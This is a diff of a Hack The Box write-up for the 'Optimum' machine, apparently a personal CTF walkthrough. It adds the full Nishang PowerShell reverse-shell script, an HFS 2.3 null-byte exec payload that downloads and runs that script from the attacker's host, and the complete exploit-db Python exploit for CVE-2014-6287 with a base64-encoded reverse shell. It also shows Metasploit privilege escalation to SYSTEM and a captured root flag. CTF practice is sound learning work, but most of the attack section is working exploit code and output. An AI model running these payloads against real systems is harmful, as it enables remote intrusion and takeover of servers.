@@ -8,6 +8,7 @@ image: https://github.com/user-attachments/assets/2211926e-985e-447e-a3c9-3ab451
 
 <img width="871" height="332" alt="image" src="https://github.com/user-attachments/assets/2211926e-985e-447e-a3c9-3ab451fcce0b" />
 
+## Recon
 nmap scan result:
 ```
 ┌──(kryzi㉿kryzi)-[~/Desktop/HTB/Optimum]
@@ -77,114 +78,299 @@ Service detection performed. Please report any incorrect results at https://nmap
 Nmap done: 1 IP address (1 host up) scanned in 100.67 seconds
            Raw packets sent: 131139 (5.770MB) | Rcvd: 74 (3.696KB)
 ```
-
 From this scan result, we find an open `port 80` running `httpfileserver (HTP) 2.3` as the version.
 
-I directly find for known exploits from **searchsploit**. 
+Initially, by visiting the website. We able to proved it. **[HTTP File Server (HFS)](https://rejetto.com/hfs/)** use to setup our machine as a webserver to transfer files without limit of size and speed. 
 
+<img width="882" height="592" alt="image" src="https://github.com/user-attachments/assets/7c2239fa-d4b9-40a5-b885-07f79be5792c" />
+
+Googled for **HFS 2.3** gave away that this version had **[CVE-2014-6287](https://www.exploit-db.com/exploits/49584)**. It is basically exploitable due to it internal scripting language that uses regex. By input `%00` initially inside search param, we would be able to escape and inject **HFS scripting** commands especially **[exec](https://rejetto.com/wiki/index.php%3Ftitle=HFS:_scripting_commands.html)**. Example: `{.exec|notepad.}`
+
+We can try those with intercepting by using burpsuite. As i said, initially we need to have the `%00` null byte sequence followed by malicious code and this case we would want to ping `{.exec|ping 10.10.16.6.}`. Setup `tcpdump` inside our machine to make sure we can verify. As no direct output as response. Here's the command `sudo tcpdump -i tun0`
+
+Used powershell reverse shell `Invoke-PowerShellTcp.ps1` from **[nishang](https://github.com/samratashok/nishang)**. Here's the content:
+```
+┌──(kryzi㉿kryzi)-[~/Desktop/HTB/Optimum]
+└─$ cat Invoke-PowerShellTcp.ps1
+function Invoke-PowerShellTcp
+{
+<#
+.SYNOPSIS
+Nishang script which can be used for Reverse or Bind interactive PowerShell from a target.
+
+.DESCRIPTION
+This script is able to connect to a standard netcat listening on a port when using the -Reverse switch.
+Also, a standard netcat can connect to this script Bind to a specific port.
+
+The script is derived from Powerfun written by Ben Turner & Dave Hardy
+
+.PARAMETER IPAddress
+The IP address to connect to when using the -Reverse switch.
+
+.PARAMETER Port
+The port to connect to when using the -Reverse switch. When using -Bind it is the port on which this script listens.
+
+.EXAMPLE
+PS > Invoke-PowerShellTcp -Reverse -IPAddress 192.168.254.226 -Port 4444
+
+Above shows an example of an interactive PowerShell reverse connect shell. A netcat/powercat listener must be listening on
+the given IP and port.
+
+.EXAMPLE
+PS > Invoke-PowerShellTcp -Bind -Port 4444
+
+Above shows an example of an interactive PowerShell bind connect shell. Use a netcat/powercat to connect to this port.
+
+.EXAMPLE
+PS > Invoke-PowerShellTcp -Reverse -IPAddress fe80::20c:29ff:fe9d:b983 -Port 4444
+
+Above shows an example of an interactive PowerShell reverse connect shell over IPv6. A netcat/powercat listener must be
+listening on the given IP and port.
+
+.LINK
+http://www.labofapenetrationtester.com/2015/05/week-of-powershell-shells-day-1.html
+https://github.com/nettitude/powershell/blob/master/powerfun.ps1
+https://github.com/samratashok/nishang
+#>
+    [CmdletBinding(DefaultParameterSetName="reverse")] Param(
+
+        [Parameter(Position = 0, Mandatory = $true, ParameterSetName="reverse")]
+        [Parameter(Position = 0, Mandatory = $false, ParameterSetName="bind")]
+        [String]
+        $IPAddress,
+
+        [Parameter(Position = 1, Mandatory = $true, ParameterSetName="reverse")]
+        [Parameter(Position = 1, Mandatory = $true, ParameterSetName="bind")]
+        [Int]
+        $Port,
+
+        [Parameter(ParameterSetName="reverse")]
+        [Switch]
+        $Reverse,
+
+        [Parameter(ParameterSetName="bind")]
+        [Switch]
+        $Bind
+
+    )
+
+
+    try
+    {
+        #Connect back if the reverse switch is used.
+        if ($Reverse)
+        {
+            $client = New-Object System.Net.Sockets.TCPClient($IPAddress,$Port)
+        }
+
+        #Bind to the provided port if Bind switch is used.
+        if ($Bind)
+        {
+            $listener = [System.Net.Sockets.TcpListener]$Port
+            $listener.start()
+            $client = $listener.AcceptTcpClient()
+        }
+
+        $stream = $client.GetStream()
+        [byte[]]$bytes = 0..65535|%{0}
+
+        #Send back current username and computername
+        $sendbytes = ([text.encoding]::ASCII).GetBytes("Windows PowerShell running as user " + $env:username + " on " + $env:computername + "`nCopyright (C) 2015 Microsoft Corporation. All rights reserved.`n`n")
+        $stream.Write($sendbytes,0,$sendbytes.Length)
+
+        #Show an interactive PowerShell prompt
+        $sendbytes = ([text.encoding]::ASCII).GetBytes('PS ' + (Get-Location).Path + '>')
+        $stream.Write($sendbytes,0,$sendbytes.Length)
+
+        while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0)
+        {
+            $EncodedText = New-Object -TypeName System.Text.ASCIIEncoding
+            $data = $EncodedText.GetString($bytes,0, $i)
+            try
+            {
+                #Execute the command on the target.
+                $sendback = (Invoke-Expression -Command $data 2>&1 | Out-String )
+            }
+            catch
+            {
+                Write-Warning "Something went wrong with execution of command on the target."
+                Write-Error $_
+            }
+            $sendback2  = $sendback + 'PS ' + (Get-Location).Path + '> '
+            $x = ($error[0] | Out-String)
+            $error.clear()
+            $sendback2 = $sendback2 + $x
+
+            #Return the results
+            $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2)
+            $stream.Write($sendbyte,0,$sendbyte.Length)
+            $stream.Flush()
+        }
+        $client.Close()
+        if ($listener)
+        {
+            $listener.Stop()
+        }
+    }
+    catch
+    {
+        Write-Warning "Something went wrong! Check if the server is reachable and you are using the correct port."
+        Write-Error $_
+    }
+}
+
+Invoke-PowerShellTcp -Reverse -IPAddress 10.10.16.6 -Port 9876
+
+┌──(kryzi㉿kryzi)-[~/Desktop/HTB/Optimum]
+└─$
+```
+Setup a webserver and use `exac` to use powershell (make sure to use **64-bit** PowerShell) to download `Invoke-PowerShellTcp.ps1` from our machine.
+
+> If you're in **64-bit** cmd.exe:
+>
+> %SystemRoot%\System32\WindowsPowerShell\v1.0\powershell.exe (launches 64-bit PowerShell)
+> 
+> %SystemRoot%\SysWOW64\WindowsPowerShell\v1.0\powershell.exe (launches 32-bit PowerShell)
+>
+> If you're in **32-bit** cmd.exe:
+>
+> %SystemRoot%\SysNative\WindowsPowerShell\v1.0\powershell.exe (launches 64-bit PowerShell)
+> 
+> %SystemRoot%\System32\WindowsPowerShell\v1.0\powershell.exe (launches 32-bit PowerShell - gets redirected to SysWOW64)
+
+```
+%00{.exec|c:\Windows\SysNative\WindowsPowerShell\v1.0\powershell.exe IEX(New-Object Net.WebClient).downloadString('http://10.10.16.6:8888/Invoke-PowerShellTcp.ps1').}
+```
+
+<img width="1226" height="695" alt="image" src="https://github.com/user-attachments/assets/2b5b9b07-9525-47cf-8685-81541cc28323" />
+
+Should be getting a shell
+
+<img width="713" height="472" alt="image" src="https://github.com/user-attachments/assets/e8a6db7b-a11d-4f00-b6aa-96b6e99707fc" />
+
+
+Or get shell by using script given by `searchsploit` and mirrored `49584.py`:
 ```
 ┌──(kryzi㉿kryzi)-[~/Desktop/HTB/Optimum]
 └─$ searchsploit hfs 2.3
--------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
- Exploit Title                                                                                                                        |  Path
--------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
-HFS (HTTP File Server) 2.3.x - Remote Command Execution (3)                                                                           | windows/remote/49584.py
-HFS Http File Server 2.3m Build 300 - Buffer Overflow (PoC)                                                                           | multiple/remote/48569.py
-Rejetto HTTP File Server (HFS) - Remote Command Execution (Metasploit)                                                                | windows/remote/34926.rb
-Rejetto HTTP File Server (HFS) 2.2/2.3 - Arbitrary File Upload                                                                        | multiple/remote/30850.txt
-Rejetto HTTP File Server (HFS) 2.3.x - Remote Command Execution (1)                                                                   | windows/remote/34668.txt
-Rejetto HTTP File Server (HFS) 2.3.x - Remote Command Execution (2)                                                                   | windows/remote/39161.py
-Rejetto HTTP File Server (HFS) 2.3a/2.3b/2.3c - Remote Command Execution                                                              | windows/webapps/34852.txt
--------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
+------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
+ Exploit Title                                                                                                                                               |  Path
+------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
+HFS (HTTP File Server) 2.3.x - Remote Command Execution (3)                                                                                                  | windows/remote/49584.py
+HFS Http File Server 2.3m Build 300 - Buffer Overflow (PoC)                                                                                                  | multiple/remote/48569.py
+Rejetto HTTP File Server (HFS) - Remote Command Execution (Metasploit)                                                                                       | windows/remote/34926.rb
+Rejetto HTTP File Server (HFS) 2.2/2.3 - Arbitrary File Upload                                                                                               | multiple/remote/30850.txt
+Rejetto HTTP File Server (HFS) 2.3.x - Remote Command Execution (1)                                                                                          | windows/remote/34668.txt
+Rejetto HTTP File Server (HFS) 2.3.x - Remote Command Execution (2)                                                                                          | windows/remote/39161.py
+Rejetto HTTP File Server (HFS) 2.3a/2.3b/2.3c - Remote Command Execution                                                                                     | windows/webapps/34852.txt
+------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Shellcodes: No Results
+
+
+┌──(kryzi㉿kryzi)-[~/Desktop/HTB/Optimum]
+└─$ searchsploit -m  49584
+  Exploit: HFS (HTTP File Server) 2.3.x - Remote Command Execution (3)
+      URL: https://www.exploit-db.com/exploits/49584
+     Path: /usr/share/exploitdb/exploits/windows/remote/49584.py
+    Codes: N/A
+ Verified: False
+File Type: ASCII text, with very long lines (546)
+Copied to: /home/kryzi/Desktop/HTB/Optimum/49584.py
 ```
-There are known RCE, i prefer using metasploit framework. 
+We should be having `49584.py`
 ```
 ┌──(kryzi㉿kryzi)-[~/Desktop/HTB/Optimum]
-└─$ msfconsole -q
-msf > search hfs 2.3
+└─$ cat 49584.py
+# Exploit Title: HFS (HTTP File Server) 2.3.x - Remote Command Execution (3)
+# Google Dork: intext:"httpfileserver 2.3"
+# Date: 20/02/2021
+# Exploit Author: Pergyz
+# Vendor Homepage: http://www.rejetto.com/hfs/
+# Software Link: https://sourceforge.net/projects/hfs/
+# Version: 2.3.x
+# Tested on: Microsoft Windows Server 2012 R2 Standard
+# CVE : CVE-2014-6287
+# Reference: https://www.rejetto.com/wiki/index.php/HFS:_scripting_commands
 
-Matching Modules
-================
+#!/usr/bin/python3
 
-   #  Name                                                 Disclosure Date  Rank       Check  Description
-   -  ----                                                 ---------------  ----       -----  -----------
-   0  exploit/multi/http/git_client_command_exec           2014-12-18       excellent  No     Malicious Git and Mercurial HTTP Server For CVE-2014-9390
-   1    \_ target: Automatic                               .                .          .      .
-   2    \_ target: Windows Powershell                      .                .          .      .
-   3  exploit/windows/http/rejetto_hfs_rce_cve_2024_23692  2024-05-25       excellent  Yes    Rejetto HTTP File Server (HFS) Unauthenticated Remote Code Execution
-   4  exploit/windows/http/rejetto_hfs_exec                2014-09-11       excellent  Yes    Rejetto HttpFileServer Remote Command Execution
+import base64
+import os
+import urllib.request
+import urllib.parse
 
+lhost = "10.10.10.1"
+lport = 1111
+rhost = "10.10.10.8"
+rport = 80
 
-Interact with a module by name or index. For example info 4, use 4 or use exploit/windows/http/rejetto_hfs_exec
+# Define the command to be written to a file
+command = f'$client = New-Object System.Net.Sockets.TCPClient("{lhost}",{lport}); $stream = $client.GetStream(); [byte[]]$bytes = 0..65535|%{{0}}; while(($i = $stream.Read($bytes,0,$bytes.Length)) -ne 0){{; $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i); $sendback = (Invoke-Expression $data 2>&1 | Out-String ); $sendback2 = $sendback + "PS " + (Get-Location).Path + "> "; $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2); $stream.Write($sendbyte,0,$sendbyte.Length); $stream.Flush()}}; $client.Close()'
 
-msf >
+# Encode the command in base64 format
+encoded_command = base64.b64encode(command.encode("utf-16le")).decode()
+print("\nEncoded the command in base64 format...")
+
+# Define the payload to be included in the URL
+payload = f'exec|powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -WindowStyle Hidden -EncodedCommand {encoded_command}'
+
+# Encode the payload and send a HTTP GET request
+encoded_payload = urllib.parse.quote_plus(payload)
+url = f'http://{rhost}:{rport}/?search=%00{{.{encoded_payload}.}}'
+urllib.request.urlopen(url)
+print("\nEncoded the payload and sent a HTTP GET request to the target...")
+
+# Print some information
+print("\nPrinting some information for debugging...")
+print("lhost: ", lhost)
+print("lport: ", lport)
+print("rhost: ", rhost)
+print("rport: ", rport)
+print("payload: ", payload)
+
+# Listen for connections
+print("\nListening for connection...")
+os.system(f'nc -nlvp {lport}')
+
 ```
-There are 4 modules, however we would choose either 3/4 but im choosing **4** instead cause the machine is around **2017** so it should be the intended way
+Change the ip and port and setup a listener to the exact port
 ```
-msf >  use 4
-[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
-msf exploit(windows/http/rejetto_hfs_exec) > options
+┌──(kryzi㉿kryzi)-[~/Desktop/HTB/Optimum]
+└─$ python3 49584.py 
 
-Module options (exploit/windows/http/rejetto_hfs_exec):
+Encoded the command in base64 format...
 
-   Name       Current Setting  Required  Description
-   ----       ---------------  --------  -----------
-   HTTPDELAY  10               no        Seconds to wait before terminating web server
-   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]. Supported proxies: socks5h, sapni, http, socks4, socks5
-   RHOSTS                      yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
-   RPORT      80               yes       The target port (TCP)
-   SRVHOST    0.0.0.0          yes       The local host or network interface to listen on. This must be an address on the local machine or 0.0.0.0 to listen on all ad
-                                         dresses.
-   SRVPORT    8080             yes       The local port to listen on.
-   SSL        false            no        Negotiate SSL/TLS for outgoing connections
-   SSLCert                     no        Path to a custom SSL certificate (default is randomly generated)
-   TARGETURI  /                yes       The path of the web application
-   URIPATH                     no        The URI to use for this exploit (default is random)
-   VHOST                       no        HTTP server virtual host
+Encoded the payload and sent a HTTP GET request to the target...
 
+Printing some information for debugging...
+lhost:  10.10.16.6
+lport:  9999
+rhost:  10.10.10.8
+rport:  80
+payload:  exec|powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -WindowStyle Hidden -EncodedCommand JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA2AC4ANgAiACwAOQA5ADkAOQApADsAIAAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwAgAFsAYgB5AHQAZQBbAF0AXQAkAGIAeQB0AGUAcwAgAD0AIAAwAC4ALgA2ADUANQAzADUAfAAlAHsAMAB9ADsAIAB3AGgAaQBsAGUAKAAoACQAaQAgAD0AIAAkAHMAdAByAGUAYQBtAC4AUgBlAGEAZAAoACQAYgB5AHQAZQBzACwAMAAsACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACAAJABkAGEAdABhACAAPQAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAC0AVAB5AHAAZQBOAGEAbQBlACAAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4AQQBTAEMASQBJAEUAbgBjAG8AZABpAG4AZwApAC4ARwBlAHQAUwB0AHIAaQBuAGcAKAAkAGIAeQB0AGUAcwAsADAALAAkAGkAKQA7ACAAJABzAGUAbgBkAGIAYQBjAGsAIAA9ACAAKABJAG4AdgBvAGsAZQAtAEUAeABwAHIAZQBzAHMAaQBvAG4AIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAIAAkAHMAZQBuAGQAYgBhAGMAawAyACAAPQAgACQAcwBlAG4AZABiAGEAYwBrACAAKwAgACIAUABTACAAIgAgACsAIAAoAEcAZQB0AC0ATABvAGMAYQB0AGkAbwBuACkALgBQAGEAdABoACAAKwAgACIAPgAgACIAOwAgACQAcwBlAG4AZABiAHkAdABlACAAPQAgACgAWwB0AGUAeAB0AC4AZQBuAGMAbwBkAGkAbgBnAF0AOgA6AEEAUwBDAEkASQApAC4ARwBlAHQAQgB5AHQAZQBzACgAJABzAGUAbgBkAGIAYQBjAGsAMgApADsAIAAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAIAAkAHMAdAByAGUAYQBtAC4ARgBsAHUAcwBoACgAKQB9ADsAIAAkAGMAbABpAGUAbgB0AC4AQwBsAG8AcwBlACgAKQA=
 
-Payload options (windows/meterpreter/reverse_tcp):
+Listening for connection...
+listening on [any] 9999 ...
+connect to [10.10.16.6] from (UNKNOWN) [10.10.10.8] 49288
 
-   Name      Current Setting  Required  Description
-   ----      ---------------  --------  -----------
-   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
-   LHOST     192.168.134.128  yes       The listen address (an interface may be specified)
-   LPORT     4444             yes       The listen port
+PS C:\Users\kostas\Desktop> dir
 
 
-Exploit target:
-
-   Id  Name
-   --  ----
-   0   Automatic
+    Directory: C:\Users\kostas\Desktop
 
 
+Mode                LastWriteTime     Length Name                                                                      
+----                -------------     ------ ----                                                                      
+d----         13/1/2026   7:02 ??            %TEMP%                                                                    
+-a---         18/3/2017   2:11 ??     760320 hfs.exe                                                                   
+-ar--         13/1/2026   1:11 ??         34 user.txt                                                                  
+-a---          7/1/2026   8:07 ??   10171904 win.exe                                                                   
 
-View the full module info with the info, or info -d command.
 
-msf exploit(windows/http/rejetto_hfs_exec) > set RHOSTS 10.10.10.8
-RHOSTS => 10.10.10.8
-msf exploit(windows/http/rejetto_hfs_exec) > set LHOST tun0
-LHOST => 10.10.16.6
-msf exploit(windows/http/rejetto_hfs_exec) > set LPORT 6666
-LPORT => 6666
-msf exploit(windows/http/rejetto_hfs_exec) > exploit -j
-[*] Exploit running as background job 0.
-[*] Exploit completed, but no session was created.
-msf exploit(windows/http/rejetto_hfs_exec) >
-[*] Started reverse TCP handler on 10.10.16.6:6666
-[*] Using URL: http://10.10.16.6:8080/B4BlrSqjnluS1F
-[*] Server started.
-[*] Sending a malicious request to /
-[*] Payload request received: /B4BlrSqjnluS1F
-[*] Sending stage (188998 bytes) to 10.10.10.8
-[!] Tried to delete %TEMP%\iZnOl.vbs, unknown result
-[*] Meterpreter session 1 opened (10.10.16.6:6666 -> 10.10.10.8:49179) at 2026-01-07 16:35:19 +0800
-
-msf exploit(windows/http/rejetto_hfs_exec) >
-[*] Server stopped.
+PS C:\Users\kostas\Desktop> 
 ```
+Of course we can do it by `msfconsole` as well by using `exploit/windows/http/rejetto_hfs_exec` module
+
 ### Shell as kostas
 
 We successfully able to get a shell as kostas
@@ -257,7 +443,7 @@ Access is denied.
 
 C:\Users>
 ```
-Next step? we are using metasploit framework. Of course! Local Suggester
+Next step? If we are using metasploit framework. Of course, Local Suggester is the best ways
 ```
 C:\Users>^Z
 Background channel 2? [y/N]  y
@@ -346,6 +532,9 @@ msf post(multi/recon/local_exploit_suggester) >
 msf post(multi/recon/local_exploit_suggester) > 
 ```
 Ive tried multiple but one of it that work for me is `exploit/windows/local/ms16_032_secondary_logon_handle_privesc`:
+
+Here's why:
+> Most exploits failed because they were UAC bypasses (need admin group) or had validation issues. MS16-032 worked because it's a true privilege escalation from low-priv user → SYSTEM, which is exactly what you needed. It's one of the most reliable Windows local privesc exploits for Server 2012 R2!
 ```
 msf post(multi/recon/local_exploit_suggester) > use exploit/windows/local/ms16_032_secondary_logon_handle_privesc
 [*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
@@ -442,3 +631,39 @@ meterpreter >
 
 ```
 ### Shell as system
+
+```
+meterpreter > shell
+Process 1980 created.
+Channel 1 created.
+Microsoft Windows [Version 6.3.9600]
+(c) 2013 Microsoft Corporation. All rights reserved.
+
+C:\Users\kostas\Desktop>whoami
+whoami
+nt authority\system
+
+C:\Users\kostas\Desktop>cd ../../Administrator/Desktop/
+cd ../../Administrator/Desktop/
+
+C:\Users\Administrator\Desktop>dir
+dir
+ Volume in drive C has no label.
+ Volume Serial Number is EE82-226D
+
+ Directory of C:\Users\Administrator\Desktop
+
+18/03/2017  02:14 ��    <DIR>          .
+18/03/2017  02:14 ��    <DIR>          ..
+13/01/2026  01:11 ��                34 root.txt
+               1 File(s)             34 bytes
+               2 Dir(s)   5.675.790.336 bytes free
+
+C:\Users\Administrator\Desktop>type root.txt
+type root.txt
+a66613d0cc1c353b8574adc17fc0800e
+
+C:\Users\Administrator\Desktop
+```
+
+**[Badge](https://labs.hackthebox.com/achievement/machine/1737187/6)**
